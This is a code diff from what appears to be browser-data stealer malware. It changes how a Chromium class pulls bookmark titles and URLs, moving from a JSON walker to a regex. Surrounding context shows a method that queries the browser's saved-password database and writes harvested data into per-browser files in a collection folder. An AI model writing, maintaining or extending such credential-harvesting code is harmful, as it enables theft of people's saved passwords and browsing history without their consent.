@@ -56,34 +56,6 @@ class Chromium:
         except:
             return "Can't decode"
 
-    def _bookmarks_reader(self, json_object):
-
-        temp = []
-
-        def read(json_object, temp):
-
-            if isinstance(json_object, dict):
-
-                for key, value in json_object.items():
-
-                    if isinstance(value, (dict, list)):
-                        read(value, temp)
-
-                    elif key == "name":
-                        temp.append([value])
-
-                    elif key == "url":
-                        temp[-1].append(value)
-
-            elif isinstance(json_object, list):
-
-                for item in json_object:
-                    read(item, temp)
-
-            return temp
-
-        return [item for item in read(json_object, temp) if len(item) >= 2]
-
     def _write_passwords(self, *args):
 
         passwords_list = args[1].execute(self.config.PasswordsSQL).fetchall()
@@ -178,16 +150,18 @@ class Chromium:
 
         with open(args[1], "r", encoding="utf-8") as bookmarks:
 
-            bookmarks_list = self._bookmarks_reader(loads(bookmarks.read()))
+            bookmarks_list = bookmarks.read().split("{")
 
         bookmarks.close()
 
-        if len(bookmarks_list) < 1:
+        results = sum([self.config.BookmarksRegex.findall(item) for item in bookmarks_list], [])
+
+        if len(results) < 1:
             return
 
         with open(rf"{self.storage_path}\Browsers\{self.browser_name}\{args[0]} Bookmarks.txt", "a", encoding="utf-8") as bookmarks:
 
-            for result in bookmarks_list:
+            for result in results:
 
                 item = f"Title: {result[0]}\nUrl: {result[1]}\n\n"
                 bookmarks.write(item)
